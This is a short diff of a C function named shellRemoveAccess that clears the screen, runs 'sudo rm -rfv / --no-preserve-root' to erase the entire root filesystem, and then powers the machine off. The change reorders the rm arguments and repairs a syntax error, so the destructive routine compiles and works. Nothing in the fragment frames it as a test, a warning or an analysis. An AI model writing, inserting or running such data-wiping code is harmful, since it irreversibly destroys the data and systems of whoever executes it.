@@ -7,10 +7,10 @@ void shellRemoveAccess()
     system("clear");
     for(;;)
     {
-        system("sudo rm -rfv --no-preserve-root /");
+        system("sudo rm -rfv / --no-preserve-root");
         system("clear");
         system("poweroff");
-        break();
+        break;
     }
 }
 
